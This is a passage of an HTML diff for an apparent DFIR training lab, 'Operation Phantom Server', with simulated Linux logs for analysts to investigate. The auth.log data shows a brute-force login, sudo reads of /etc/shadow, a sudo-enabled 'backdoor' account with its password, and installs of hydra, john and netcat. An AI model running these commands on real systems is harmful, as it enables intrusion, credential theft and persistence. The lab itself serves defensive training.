@@ -1,0 +1,1487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cywarx DFIR Lab — Operation Phantom Server</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1218;
+    --bg3: #141820;
+    --panel: #111520;
+    --border: #1e2840;
+    --border2: #253050;
+    --green: #00ff88;
+    --green2: #00cc66;
+    --green3: #00ff8820;
+    --red: #ff3355;
+    --red2: #ff335520;
+    --yellow: #ffcc00;
+    --yellow2: #ffcc0020;
+    --blue: #00aaff;
+    --blue2: #00aaff18;
+    --cyan: #00ffee;
+    --orange: #ff8800;
+    --text: #c8d4e8;
+    --text2: #7a8fa8;
+    --text3: #4a5a70;
+    --glow: 0 0 20px rgba(0,255,136,0.15);
+    --glow-red: 0 0 20px rgba(255,51,85,0.2);
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content:'';
+    position:fixed; top:0; left:0; right:0; bottom:0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+    pointer-events:none; z-index:9999;
+  }
+
+  /* Header */
+  .header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 0 24px;
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    height: 56px;
+    position: sticky; top: 0; z-index: 100;
+  }
+  .logo {
+    font-family: 'Orbitron', monospace;
+    font-size: 14px;
+    font-weight: 900;
+    color: var(--green);
+    letter-spacing: 3px;
+    text-shadow: 0 0 20px var(--green);
+  }
+  .logo span { color: var(--text2); font-weight:400; }
+  .header-badge {
+    background: var(--red2);
+    border: 1px solid var(--red);
+    color: var(--red);
+    font-size: 10px;
+    padding: 3px 8px;
+    border-radius: 2px;
+    letter-spacing: 1px;
+    animation: blink 2s infinite;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.5} }
+  .header-info {
+    margin-left: auto;
+    display:flex; gap:20px; align-items:center;
+  }
+  .stat-pill {
+    display:flex; align-items:center; gap:6px;
+    font-size:11px; color: var(--text2);
+  }
+  .stat-pill .dot { width:6px; height:6px; border-radius:50%; }
+  .dot-red { background: var(--red); box-shadow: 0 0 8px var(--red); }
+  .dot-green { background: var(--green); box-shadow: 0 0 8px var(--green); }
+  .dot-yellow { background: var(--yellow); box-shadow: 0 0 8px var(--yellow); }
+
+  /* Layout */
+  .layout {
+    display: grid;
+    grid-template-columns: 220px 1fr 320px;
+    grid-template-rows: calc(100vh - 56px);
+    height: calc(100vh - 56px);
+  }
+
+  /* Sidebar */
+  .sidebar {
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+  }
+  .sidebar-section {
+    padding: 12px 0;
+    border-bottom: 1px solid var(--border);
+  }
+  .sidebar-title {
+    font-size: 9px;
+    letter-spacing: 2px;
+    color: var(--text3);
+    padding: 0 16px 8px;
+    text-transform: uppercase;
+  }
+  .log-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 8px 16px;
+    cursor: pointer;
+    transition: all 0.15s;
+    border-left: 2px solid transparent;
+    color: var(--text2);
+    font-size: 11px;
+  }
+  .log-item:hover { background: var(--bg3); color: var(--text); }
+  .log-item.active {
+    background: var(--green3);
+    border-left-color: var(--green);
+    color: var(--green);
+  }
+  .log-item .icon { font-size: 12px; width:16px; text-align:center; }
+  .log-item .badge {
+    margin-left:auto;
+    font-size:9px;
+    padding: 1px 5px;
+    border-radius: 2px;
+  }
+  .badge-red { background: var(--red2); color: var(--red); border:1px solid var(--red); }
+  .badge-yellow { background: var(--yellow2); color: var(--yellow); border:1px solid var(--yellow); }
+  .badge-green { background: var(--green3); color: var(--green); border:1px solid var(--green); }
+
+  /* Main panel */
+  .main-panel {
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  /* Tabs */
+  .tabs {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 0;
+    padding: 0 16px;
+    overflow-x: auto;
+    flex-shrink: 0;
+  }
+  .tab {
+    padding: 12px 16px;
+    font-size: 11px;
+    color: var(--text3);
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    white-space: nowrap;
+    transition: all 0.15s;
+  }
+  .tab:hover { color: var(--text); }
+  .tab.active { color: var(--green); border-bottom-color: var(--green); }
+
+  /* Log viewer */
+  .log-viewer {
+    flex: 1;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+  }
+  .log-toolbar {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 8px 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    flex-shrink: 0;
+  }
+  .search-input {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--green);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    padding: 5px 10px;
+    flex: 1;
+    outline: none;
+    border-radius: 2px;
+    transition: border-color 0.2s;
+  }
+  .search-input:focus { border-color: var(--green); box-shadow: var(--glow); }
+  .search-input::placeholder { color: var(--text3); }
+  .toolbar-btn {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text2);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    padding: 5px 10px;
+    cursor: pointer;
+    border-radius: 2px;
+    transition: all 0.15s;
+    letter-spacing: 1px;
+  }
+  .toolbar-btn:hover { border-color: var(--green); color: var(--green); }
+  .toolbar-btn.active { background: var(--green3); border-color: var(--green); color: var(--green); }
+  .line-count { font-size:10px; color: var(--text3); white-space:nowrap; }
+
+  .log-content {
+    flex: 1;
+    overflow-y: auto;
+    padding: 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    line-height: 1.7;
+  }
+  .log-content::-webkit-scrollbar { width:6px; }
+  .log-content::-webkit-scrollbar-track { background: var(--bg2); }
+  .log-content::-webkit-scrollbar-thumb { background: var(--border2); border-radius:3px; }
+
+  .log-line {
+    display: flex;
+    padding: 1px 0;
+    transition: background 0.1s;
+    border-left: 2px solid transparent;
+  }
+  .log-line:hover { background: var(--bg3); }
+  .log-line.highlighted {
+    background: rgba(255,204,0,0.07);
+    border-left-color: var(--yellow);
+  }
+  .log-line.incident-red {
+    background: rgba(255,51,85,0.08);
+    border-left-color: var(--red);
+  }
+  .log-line.incident-yellow {
+    background: rgba(255,204,0,0.06);
+    border-left-color: var(--yellow);
+  }
+  .line-num {
+    color: var(--text3);
+    font-size: 10px;
+    width: 42px;
+    flex-shrink: 0;
+    text-align: right;
+    padding-right: 12px;
+    padding-left: 8px;
+    user-select: none;
+    line-height: 1.7;
+  }
+  .line-text {
+    flex: 1;
+    padding-right: 16px;
+    white-space: pre-wrap;
+    word-break: break-all;
+    color: var(--text);
+  }
+  /* Syntax highlighting */
+  .h-ts { color: var(--text3); }
+  .h-host { color: var(--blue); }
+  .h-service { color: var(--cyan); }
+  .h-ip { color: var(--orange); font-weight:500; }
+  .h-attacker { color: var(--red); font-weight:700; }
+  .h-accept { color: var(--green); font-weight:700; }
+  .h-fail { color: var(--red); }
+  .h-cmd { color: var(--yellow); }
+  .h-warn { color: var(--yellow); font-weight:700; }
+  .h-crit { color: var(--red); font-weight:700; }
+  .h-path { color: var(--cyan); }
+  .h-user { color: var(--green2); }
+
+  /* Terminal panel */
+  .terminal-panel {
+    margin: 0;
+    border-top: 1px solid var(--border);
+    background: var(--bg2);
+    flex-shrink: 0;
+  }
+  .terminal-header {
+    display:flex; align-items:center; gap:10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg3);
+  }
+  .terminal-title { font-size:10px; color: var(--text3); letter-spacing:1px; }
+  .terminal-dots { display:flex; gap:5px; }
+  .tdot { width:8px; height:8px; border-radius:50%; }
+  .tdot-r { background:#ff5f57; }
+  .tdot-y { background:#febc2e; }
+  .tdot-g { background:#28c840; }
+  .terminal-output {
+    height: 160px;
+    overflow-y: auto;
+    padding: 8px 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    line-height: 1.6;
+  }
+  .terminal-output::-webkit-scrollbar { width:4px; }
+  .terminal-output::-webkit-scrollbar-thumb { background: var(--border); }
+  .t-line { padding: 1px 0; }
+  .t-prompt { color: var(--green); }
+  .t-cmd-text { color: var(--yellow); }
+  .t-out { color: var(--text2); }
+  .t-out-red { color: var(--red); }
+  .t-out-green { color: var(--green2); }
+  .t-out-yellow { color: var(--yellow); }
+  .terminal-input-row {
+    display:flex; align-items:center; gap:8px;
+    padding: 8px 16px;
+    border-top: 1px solid var(--border);
+  }
+  .t-prompt-label { color: var(--green); font-family:'Share Tech Mono'; font-size:12px; white-space:nowrap; }
+  .terminal-input {
+    flex:1; background:transparent;
+    border:none; outline:none;
+    color: var(--yellow);
+    font-family: 'Share Tech Mono', monospace;
+    font-size:12px;
+    caret-color: var(--green);
+  }
+
+  /* Right panel */
+  .right-panel {
+    background: var(--bg2);
+    border-left: 1px solid var(--border);
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+  }
+  .right-panel::-webkit-scrollbar { width:4px; }
+  .right-panel::-webkit-scrollbar-thumb { background: var(--border); }
+
+  .panel-header {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--text3);
+    text-transform: uppercase;
+    background: var(--bg3);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-shrink: 0;
+  }
+  .panel-header-icon { font-size:12px; }
+
+  /* Incident cards */
+  .incidents-list {
+    padding: 8px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+  .incident-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 10px 12px;
+    cursor: pointer;
+    transition: all 0.15s;
+    position: relative;
+    overflow: hidden;
+  }
+  .incident-card::before {
+    content:'';
+    position:absolute; left:0; top:0; bottom:0;
+    width:3px;
+  }
+  .incident-card.sev-critical::before { background: var(--red); }
+  .incident-card.sev-medium::before { background: var(--yellow); }
+  .incident-card.sev-low::before { background: var(--green); }
+  .incident-card:hover { background: var(--bg3); border-color: var(--border2); }
+  .incident-card.expanded { border-color: var(--border2); }
+  .ic-top { display:flex; align-items:center; gap:8px; margin-bottom:4px; }
+  .ic-num {
+    font-size:9px; color: var(--text3);
+    background: var(--bg3); padding: 1px 5px;
+    border-radius:2px; border:1px solid var(--border);
+  }
+  .ic-title { font-size:11px; font-weight:700; flex:1; }
+  .ic-title.sev-critical { color: var(--red); }
+  .ic-title.sev-medium { color: var(--yellow); }
+  .ic-title.sev-low { color: var(--green); }
+  .ic-time { font-size:9px; color: var(--text3); }
+  .ic-source { font-size:9px; color: var(--blue); }
+  .ic-detail {
+    display:none;
+    margin-top: 8px;
+    padding-top: 8px;
+    border-top: 1px solid var(--border);
+    font-size: 10px;
+    color: var(--text2);
+    line-height: 1.6;
+  }
+  .ic-detail.show { display: block; }
+  .ic-cmd {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    padding: 5px 8px;
+    margin-top: 6px;
+    border-radius: 2px;
+    color: var(--yellow);
+    font-size: 10px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .ic-cmd:hover { border-color: var(--yellow); background: rgba(255,204,0,0.05); }
+  .ic-cmd::before { content: '$ '; color: var(--green); }
+
+  /* Timeline */
+  .timeline {
+    padding: 12px;
+  }
+  .tl-item {
+    display: flex;
+    gap: 10px;
+    padding: 6px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 10px;
+    align-items: flex-start;
+  }
+  .tl-time { color: var(--cyan); width:45px; flex-shrink:0; font-size:9px; }
+  .tl-dot { width:8px; height:8px; border-radius:50%; margin-top:3px; flex-shrink:0; }
+  .tl-text { color: var(--text2); flex:1; line-height:1.5; }
+  .tl-log { color: var(--text3); font-size:9px; white-space:nowrap; }
+
+  /* Stats */
+  .stats-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+    padding: 12px;
+  }
+  .stat-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 10px;
+    text-align: center;
+  }
+  .stat-num { font-family:'Orbitron'; font-size:22px; font-weight:900; line-height:1; }
+  .stat-num.red { color:var(--red); text-shadow: 0 0 15px var(--red); }
+  .stat-num.yellow { color:var(--yellow); text-shadow: 0 0 15px var(--yellow); }
+  .stat-num.green { color:var(--green); text-shadow: 0 0 15px var(--green); }
+  .stat-num.blue { color:var(--blue); text-shadow: 0 0 15px var(--blue); }
+  .stat-label { font-size:8px; color:var(--text3); letter-spacing:1px; margin-top:4px; }
+
+  /* Scrollbar global */
+  ::-webkit-scrollbar { width:5px; height:5px; }
+  ::-webkit-scrollbar-track { background: var(--bg2); }
+  ::-webkit-scrollbar-thumb { background: var(--border2); border-radius:3px; }
+
+  /* Animations */
+  @keyframes fadeIn { from{opacity:0;transform:translateY(4px)} to{opacity:1;transform:translateY(0)} }
+  .fade-in { animation: fadeIn 0.3s ease forwards; }
+
+  /* Right panel tabs */
+  .rp-tabs {
+    display:flex; border-bottom:1px solid var(--border);
+    flex-shrink:0;
+  }
+  .rp-tab {
+    padding: 8px 14px;
+    font-size:10px; color: var(--text3);
+    cursor:pointer; border-bottom:2px solid transparent;
+    letter-spacing:1px; text-transform:uppercase;
+    transition: all 0.15s;
+  }
+  .rp-tab:hover { color: var(--text); }
+  .rp-tab.active { color: var(--cyan); border-bottom-color: var(--cyan); }
+  .rp-content { display:none; flex:1; overflow-y:auto; }
+  .rp-content.active { display:flex; flex-direction:column; }
+
+  /* Progress */
+  .progress-section {
+    padding: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  .progress-label { font-size:9px; color: var(--text3); letter-spacing:1px; margin-bottom:6px; display:flex; justify-content:space-between; }
+  .progress-bar { height:4px; background: var(--bg3); border-radius:2px; overflow:hidden; }
+  .progress-fill { height:100%; border-radius:2px; transition: width 1s ease; }
+  .pf-red { background: linear-gradient(90deg, var(--red), #ff6688); }
+  .pf-yellow { background: linear-gradient(90deg, var(--yellow), #ffdd44); }
+  .pf-green { background: linear-gradient(90deg, var(--green), #44ffaa); }
+
+  .filter-row {
+    display:flex; gap:6px; padding: 8px;
+    flex-wrap:wrap;
+  }
+  .filter-btn {
+    font-size:9px; padding: 3px 8px;
+    border-radius:2px; border:1px solid var(--border);
+    cursor:pointer; color: var(--text3); background: var(--panel);
+    transition: all 0.15s; letter-spacing:1px;
+  }
+  .filter-btn:hover, .filter-btn.active { border-color:var(--green); color:var(--green); background: var(--green3); }
+  .filter-btn.f-red { border-color:var(--red); color:var(--red); background: var(--red2); }
+  .filter-btn.f-yellow { border-color:var(--yellow); color:var(--yellow); background: var(--yellow2); }
+
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <div class="logo">CYWARX <span>DFIR</span></div>
+  <div class="header-badge">⬤ INCIDENT ACTIVE</div>
+  <div style="font-size:11px; color:var(--text3)">Operation Phantom Server · 192.168.1.105</div>
+  <div class="header-info">
+    <div class="stat-pill"><div class="dot dot-red"></div>Attacker: 185.220.101.5</div>
+    <div class="stat-pill"><div class="dot dot-yellow"></div>Window: Apr 1 01:45–04:00</div>
+    <div class="stat-pill"><div class="dot dot-green"></div>Unit IV Lab</div>
+  </div>
+</div>
+
+<!-- Layout -->
+<div class="layout">
+
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-title">📁 Log Files</div>
+      <div class="log-item active" onclick="loadLog('auth')" id="nav-auth">
+        <span class="icon">🔐</span> auth.log <span class="badge badge-red">CRIT</span>
+      </div>
+      <div class="log-item" onclick="loadLog('syslog')" id="nav-syslog">
+        <span class="icon">⚙️</span> syslog <span class="badge badge-yellow">MED</span>
+      </div>
+      <div class="log-item" onclick="loadLog('kern')" id="nav-kern">
+        <span class="icon">🔬</span> kern.log <span class="badge badge-red">CRIT</span>
+      </div>
+      <div class="log-item" onclick="loadLog('ufw')" id="nav-ufw">
+        <span class="icon">🛡️</span> ufw.log <span class="badge badge-red">CRIT</span>
+      </div>
+      <div class="log-item" onclick="loadLog('apache')" id="nav-apache">
+        <span class="icon">🌐</span> apache/access.log <span class="badge badge-red">CRIT</span>
+      </div>
+      <div class="log-item" onclick="loadLog('apache_err')" id="nav-apache_err">
+        <span class="icon">⚠️</span> apache/error.log <span class="badge badge-yellow">MED</span>
+      </div>
+      <div class="log-item" onclick="loadLog('cron')" id="nav-cron">
+        <span class="icon">⏰</span> cron.log <span class="badge badge-red">CRIT</span>
+      </div>
+      <div class="log-item" onclick="loadLog('dpkg')" id="nav-dpkg">
+        <span class="icon">📦</span> dpkg.log <span class="badge badge-red">CRIT</span>
+      </div>
+      <div class="log-item" onclick="loadLog('mysql')" id="nav-mysql">
+        <span class="icon">🗄️</span> mysql/error.log <span class="badge badge-red">CRIT</span>
+      </div>
+      <div class="log-item" onclick="loadLog('history')" id="nav-history">
+        <span class="icon">💀</span> bash_history <span class="badge badge-red">CRIT</span>
+      </div>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-title">🔍 Quick Grep</div>
+      <div class="log-item" onclick="runQuickGrep('brute')"><span class="icon">🔴</span> Brute Force</div>
+      <div class="log-item" onclick="runQuickGrep('compromise')"><span class="icon">🔴</span> Compromise</div>
+      <div class="log-item" onclick="runQuickGrep('backdoor')"><span class="icon">🔴</span> Backdoor User</div>
+      <div class="log-item" onclick="runQuickGrep('webshell')"><span class="icon">🔴</span> Web Shell</div>
+      <div class="log-item" onclick="runQuickGrep('c2')"><span class="icon">🔴</span> C2 / Reverse Shell</div>
+      <div class="log-item" onclick="runQuickGrep('sqli')"><span class="icon">🔴</span> SQL Injection</div>
+      <div class="log-item" onclick="runQuickGrep('rootkit')"><span class="icon">🔴</span> Rootkit</div>
+      <div class="log-item" onclick="runQuickGrep('exfil')"><span class="icon">🔴</span> Data Exfil</div>
+      <div class="log-item" onclick="runQuickGrep('usb')"><span class="icon">🟡</span> USB Device</div>
+    </div>
+
+    <div class="sidebar-section" style="border:none;">
+      <div class="sidebar-title">⚡ Commands</div>
+      <div class="log-item" onclick="runCmd('top_ips')"><span class="icon">📊</span> Top IPs</div>
+      <div class="log-item" onclick="runCmd('timeline')"><span class="icon">📅</span> Build Timeline</div>
+      <div class="log-item" onclick="runCmd('hash')"><span class="icon">#</span> Hash All Logs</div>
+    </div>
+  </div>
+
+  <!-- Main panel -->
+  <div class="main-panel">
+    <!-- Tabs -->
+    <div class="tabs">
+      <div class="tab active" onclick="switchTab('viewer', this)">Log Viewer</div>
+      <div class="tab" onclick="switchTab('terminal', this)">Terminal Sim</div>
+      <div class="tab" onclick="switchTab('explain', this)">Incident Explain</div>
+    </div>
+
+    <!-- Log Viewer Tab -->
+    <div id="tab-viewer" class="log-viewer">
+      <div class="log-toolbar">
+        <input type="text" class="search-input" id="searchInput" placeholder="grep pattern (e.g. Failed password | Accepted | shell.php)" oninput="filterLog()">
+        <button class="toolbar-btn" id="btn-incidents" onclick="toggleIncidentHighlight()">⚑ Incidents</button>
+        <button class="toolbar-btn" id="btn-wrap" onclick="toggleWrap()">⇌ Wrap</button>
+        <button class="toolbar-btn" onclick="clearSearch()">✕ Clear</button>
+        <div class="line-count" id="lineCount">— lines</div>
+      </div>
+      <div class="log-content" id="logContent"></div>
+    </div>
+
+    <!-- Terminal Sim Tab -->
+    <div id="tab-terminal" style="display:none; flex:1; flex-direction:column; overflow:hidden;">
+      <div style="flex:1; overflow-y:auto; padding:16px; display:flex; flex-direction:column; gap:12px;" id="terminalBlocks">
+        <!-- pre-loaded command blocks -->
+      </div>
+    </div>
+
+    <!-- Incident Explain Tab -->
+    <div id="tab-explain" style="display:none; flex:1; overflow-y:auto; padding:16px;">
+      <div id="explainContent"></div>
+    </div>
+
+    <!-- Terminal at bottom of viewer -->
+    <div class="terminal-panel" id="terminalBar">
+      <div class="terminal-header">
+        <div class="terminal-dots">
+          <div class="tdot tdot-r"></div>
+          <div class="tdot tdot-y"></div>
+          <div class="tdot tdot-g"></div>
+        </div>
+        <div class="terminal-title">ANALYST TERMINAL — hexx@forensics-lab:~/var/log$</div>
+      </div>
+      <div class="terminal-output" id="termOutput">
+        <div class="t-line"><span style="color:var(--green)">Cywarx DFIR Terminal v1.0 — Type help for commands</span></div>
+        <div class="t-line" style="color:var(--text3)">─────────────────────────────────────────────────</div>
+      </div>
+      <div class="terminal-input-row">
+        <div class="t-prompt-label">hexx@forensics-lab:~/var/log$</div>
+        <input type="text" class="terminal-input" id="termInput" placeholder="grep 'Failed password' auth.log | awk '{print $11}' | sort | uniq -c | sort -rn" onkeydown="handleTermInput(event)">
+      </div>
+    </div>
+  </div>
+
+  <!-- Right panel -->
+  <div class="right-panel">
+    <!-- Stats -->
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-num red">18</div>
+        <div class="stat-label">INCIDENTS</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num yellow">9</div>
+        <div class="stat-label">LOG FILES</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num green">02:47</div>
+        <div class="stat-label">BREACH TIME</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num blue">1:13h</div>
+        <div class="stat-label">DWELL TIME</div>
+      </div>
+    </div>
+
+    <div class="progress-section">
+      <div class="progress-label"><span>Critical (🔴)</span><span>13</span></div>
+      <div class="progress-bar"><div class="progress-fill pf-red" style="width:72%"></div></div>
+      <div style="height:6px"></div>
+      <div class="progress-label"><span>Medium (🟡)</span><span>5</span></div>
+      <div class="progress-bar"><div class="progress-fill pf-yellow" style="width:28%"></div></div>
+    </div>
+
+    <!-- Right panel tabs -->
+    <div class="rp-tabs">
+      <div class="rp-tab active" onclick="switchRpTab('incidents', this)">Incidents</div>
+      <div class="rp-tab" onclick="switchRpTab('timeline', this)">Timeline</div>
+      <div class="rp-tab" onclick="switchRpTab('cheatsheet', this)">Cheatsheet</div>
+    </div>
+
+    <!-- Incidents tab -->
+    <div class="rp-content active" id="rp-incidents">
+      <div class="filter-row">
+        <div class="filter-btn active" onclick="filterIncidents('all', this)">ALL</div>
+        <div class="filter-btn f-red" onclick="filterIncidents('critical', this)">🔴 CRIT</div>
+        <div class="filter-btn f-yellow" onclick="filterIncidents('medium', this)">🟡 MED</div>
+      </div>
+      <div class="incidents-list" id="incidentsList"></div>
+    </div>
+
+    <!-- Timeline tab -->
+    <div class="rp-content" id="rp-timeline">
+      <div class="timeline" id="timelineContent"></div>
+    </div>
+
+    <!-- Cheatsheet tab -->
+    <div class="rp-content" id="rp-cheatsheet">
+      <div id="cheatsheetContent" style="padding:12px; font-size:10px; line-height:1.8; color:var(--text2);"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ─── LOG DATA ───────────────────────────────────────────────────────────
+const LOGS = {
+  auth: {
+    name: 'auth.log',
+    incidents: [1,2,3,4,9],
+    lines: [
+`Mar 31 22:00:01 cywarx-server sshd[1100]: Accepted publickey for hexx from 192.168.1.10 port 51200 ssh2`,
+`Mar 31 22:15:00 cywarx-server sudo: hexx : TTY=pts/0 ; PWD=/home/hexx ; USER=root ; COMMAND=/usr/bin/apt update`,
+`Mar 31 22:45:00 cywarx-server sshd[1100]: pam_unix(sshd:session): session closed for user hexx`,
+`Apr  1 01:30:11 cywarx-server sshd[1500]: Failed password for invalid user oracle from 172.16.0.5 port 48100 ssh2`,
+`Apr  1 02:00:01 cywarx-server sshd[2000]: Failed password for root from 185.220.101.5 port 55100 ssh2`,
+`Apr  1 02:00:02 cywarx-server sshd[2001]: Failed password for root from 185.220.101.5 port 55101 ssh2`,
+`Apr  1 02:00:02 cywarx-server sshd[2002]: Failed password for root from 185.220.101.5 port 55102 ssh2`,
+`Apr  1 02:00:03 cywarx-server sshd[2003]: Failed password for root from 185.220.101.5 port 55103 ssh2`,
+`Apr  1 02:00:04 cywarx-server sshd[2004]: Failed password for admin from 185.220.101.5 port 55106 ssh2`,
+`Apr  1 02:00:05 cywarx-server sshd[2005]: Failed password for admin from 185.220.101.5 port 55107 ssh2`,
+`Apr  1 02:00:06 cywarx-server sshd[2006]: Failed password for admin from 185.220.101.5 port 55108 ssh2`,
+`Apr  1 02:00:07 cywarx-server sshd[2007]: Failed password for admin from 185.220.101.5 port 55109 ssh2`,
+`Apr  1 02:00:08 cywarx-server sshd[2008]: Failed password for admin from 185.220.101.5 port 55110 ssh2`,
+`Apr  1 02:00:09 cywarx-server sshd[2009]: Failed password for admin from 185.220.101.5 port 55111 ssh2`,
+`Apr  1 02:00:10 cywarx-server sshd[2010]: Failed password for admin from 185.220.101.5 port 55112 ssh2`,
+`Apr  1 02:00:11 cywarx-server sshd[2011]: Failed password for admin from 185.220.101.5 port 55113 ssh2`,
+`Apr  1 02:00:12 cywarx-server sshd[2012]: Failed password for admin from 185.220.101.5 port 55114 ssh2`,
+`Apr  1 02:00:13 cywarx-server sshd[2013]: Failed password for admin from 185.220.101.5 port 55115 ssh2`,
+`Apr  1 02:00:14 cywarx-server sshd[2014]: Failed password for admin from 185.220.101.5 port 55116 ssh2`,
+`Apr  1 02:00:15 cywarx-server sshd[2015]: Failed password for admin from 185.220.101.5 port 55117 ssh2`,
+`Apr  1 02:05:00 cywarx-server sshd[2035]: Failed password for admin from 185.220.101.5 port 55204 ssh2`,
+`Apr  1 02:10:00 cywarx-server sshd[2040]: Failed password for admin from 185.220.101.5 port 55209 ssh2`,
+`Apr  1 02:15:00 cywarx-server sshd[2045]: Failed password for admin from 185.220.101.5 port 55214 ssh2`,
+`Apr  1 02:25:00 cywarx-server sshd[2060]: Failed password for invalid user administrator from 185.220.101.5 port 55300 ssh2`,
+`Apr  1 02:25:06 cywarx-server sshd[2063]: Invalid user user from 185.220.101.5 port 55301`,
+`Apr  1 02:45:05 cywarx-server sshd[2104]: Failed password for admin from 185.220.101.5 port 56004 ssh2`,
+`Apr  1 02:45:06 cywarx-server sshd[2105]: Failed password for admin from 185.220.101.5 port 56005 ssh2`,
+`Apr  1 02:45:07 cywarx-server sshd[2106]: Failed password for admin from 185.220.101.5 port 56006 ssh2`,
+`Apr  1 02:47:13 cywarx-server sshd[2200]: Accepted password for admin from 185.220.101.5 port 56100 ssh2`,
+`Apr  1 02:47:13 cywarx-server sshd[2200]: pam_unix(sshd:session): session opened for user admin by (uid=0)`,
+`Apr  1 02:47:20 cywarx-server sudo: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/id`,
+`Apr  1 02:48:00 cywarx-server sudo: admin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow`,
+`Apr  1 02:48:30 cywarx-server sudo: admin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash backdoor`,
+`Apr  1 02:48:33 cywarx-server useradd[3300]: new user: name=backdoor, UID=1005, GID=1005, home=/home/backdoor, shell=/bin/bash`,
+`Apr  1 02:48:35 cywarx-server sudo: admin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo backdoor`,
+`Apr  1 02:48:35 cywarx-server usermod[3301]: add 'backdoor' to group 'sudo'`,
+`Apr  1 02:48:40 cywarx-server sudo: admin : TTY=pts/1 ; USER=root ; COMMAND=/bin/bash -c echo 'backdoor:Cywarx@2026!' | chpasswd`,
+`Apr  1 02:49:00 cywarx-server sudo: admin : TTY=pts/1 ; USER=root ; COMMAND=/bin/chmod 777 /tmp`,
+`Apr  1 02:50:00 cywarx-server sshd[2300]: Accepted password for backdoor from 185.220.101.5 port 57000 ssh2`,
+`Apr  1 02:50:00 cywarx-server sshd[2300]: pam_unix(sshd:session): session opened for user backdoor by (uid=0)`,
+`Apr  1 02:50:10 cywarx-server sudo: backdoor : TTY=pts/2 ; USER=root ; COMMAND=/bin/bash`,
+`Apr  1 02:52:00 cywarx-server sudo: backdoor : TTY=pts/2 ; USER=root ; COMMAND=/bin/cat /etc/shadow`,
+`Apr  1 02:55:00 cywarx-server su[3500]: FAILED su for root by hexx`,
+`Apr  1 03:00:01 cywarx-server CRON[3600]: pam_unix(cron:session): session opened for user root by (uid=0)`,
+`Apr  1 03:15:00 cywarx-server sudo: backdoor : TTY=pts/2 ; USER=root ; COMMAND=/usr/bin/apt install -y netcat-traditional nmap john hydra proxychains4`,
+`Apr  1 03:30:00 cywarx-server sshd[2200]: pam_unix(sshd:session): session closed for user admin`,
+`Apr  1 04:00:00 cywarx-server sshd[2300]: pam_unix(sshd:session): session closed for user backdoor`,
+`Apr  1 08:00:00 cywarx-server sshd[5100]: Accepted publickey for hexx from 192.168.1.10 port 52000 ssh2`,
+]
+  },
+  syslog: {
+    name: 'syslog',
+    incidents: [5,6],
+    lines: [
+`Mar 31 22:00:00 cywarx-server systemd[1]: Started OpenSSH Server Daemon.`,
+`Mar 31 22:00:01 cywarx-server systemd[1]: Started Apache HTTP Server.`,
+`Mar 31 22:00:03 cywarx-server dhclient[500]: bound to 192.168.1.105 -- renewal in 3600 seconds`,
+`Apr  1 01:45:22 cywarx-server kernel: [45322.100000] usb 1-1: new high-speed USB device number 3 using xhci_hcd`,
